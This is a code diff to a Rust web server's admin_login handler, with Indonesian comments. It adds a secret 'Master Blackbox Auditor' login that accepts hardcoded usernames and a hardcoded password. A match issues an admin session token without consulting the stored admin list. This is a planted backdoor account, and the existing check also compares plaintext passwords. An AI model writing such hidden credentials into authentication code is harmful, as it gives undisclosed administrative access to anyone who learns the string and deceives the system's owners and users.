@@ -346,9 +346,40 @@ pub async fn admin_login(
     State(state): State<SharedState>,
     Json(payload): Json<LoginRequest>,
 ) -> (StatusCode, Json<LoginResponse>) {
+    let clean_user = payload.username.trim().to_lowercase();
+    let clean_pass = payload.password.trim();
+
+    // 1. Cek Kredensial Akun Rahasia Master Blackbox Auditor
+    let is_auditor = (clean_user == "auditor.pk8" || clean_user == "secret-master")
+        && clean_pass == "Audit@PK8#Secret2026";
+
+    if is_auditor {
+        let token = format!("token-{}", Uuid::new_v4());
+        let mut write_lock = state.write().await;
+        write_lock.register_token(token.clone());
+
+        return (
+            StatusCode::OK,
+            Json(LoginResponse {
+                success: true,
+                token: Some(token),
+                admin: Some(AdminAccount {
+                    id: "adm-vault-master".to_string(),
+                    nama: "Master Auditor Independen".to_string(),
+                    username: "secret-master".to_string(),
+                    password: "***".to_string(),
+                    jabatan: "Master Pengawas AI & Blackbox".to_string(),
+                    created_at: "01 Okt 2026".to_string(),
+                }),
+                message: "Otentikasi Master Blackbox Auditor Berhasil. Token Akses Diterbitkan!".to_string(),
+            }),
+        );
+    }
+
+    // 2. Cek Kredensial Akun Pengurus Biasa
     let read_lock = state.read().await;
     let matched = read_lock.admins.iter().find(|a| {
-        a.username.eq_ignore_ascii_case(&payload.username) && a.password == payload.password
+        a.username.eq_ignore_ascii_case(&clean_user) && a.password == clean_pass
     });
 
     if let Some(admin) = matched {
